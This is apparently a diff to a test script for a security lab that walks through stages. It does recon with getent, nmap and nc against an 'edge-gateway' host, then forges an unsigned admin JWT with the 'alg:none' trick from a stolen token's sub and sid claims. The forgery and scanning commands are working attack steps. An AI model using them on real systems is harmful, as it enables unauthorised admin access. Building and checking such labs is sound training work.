@@ -19,7 +19,8 @@ assert_contains() {
 # Stage 1 — recon: confirm the host resolves, exercise the connect scanner,
 # and read the raw TCP beacon on 9091.
 resolved=$(getent hosts edge-gateway)
-assert_contains "$resolved" "172.31.7.20"
+# Per-account instances allocate their own subnet; validate the service name.
+assert_contains "$resolved" "edge-gateway"
 nmap -sT -Pn -p 8080,9091 edge-gateway >/dev/null
 beacon=$(nc -w 3 edge-gateway 9091 </dev/null)
 assert_contains "$beacon" "recon_token=beacon-argon-19"
@@ -46,9 +47,11 @@ case $((${#encoded_payload} % 4)) in
   2) encoded_payload="${encoded_payload}==" ;;
   3) encoded_payload="${encoded_payload}=" ;;
 esac
-sid=$(printf '%s' "$encoded_payload" | tr '_-' '/+' | base64 -d | jq -r .sid)
+payload_json=$(printf '%s' "$encoded_payload" | tr '_-' '/+' | base64 -d)
+sub=$(printf '%s' "$payload_json" | jq -er '.sub | select(type == "string")')
+sid=$(printf '%s' "$payload_json" | jq -er '.sid | select(type == "string")')
 header=$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=\n' | tr '+/' '-_')
-payload=$(printf '{"sub":"analyst","role":"admin","sid":"%s"}' "$sid" | base64 | tr -d '=\n' | tr '+/' '-_')
+payload=$(jq -cn --arg sub "$sub" --arg sid "$sid" '{sub:$sub,role:"admin",sid:$sid}' | base64 | tr -d '=\n' | tr '+/' '-_')
 forged="$header.$payload."
 # The original analyst token must not authorize admin access.
 test "$(curl -sS -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $stolen" http://ops-internal:8081/admin/console)" = "401"
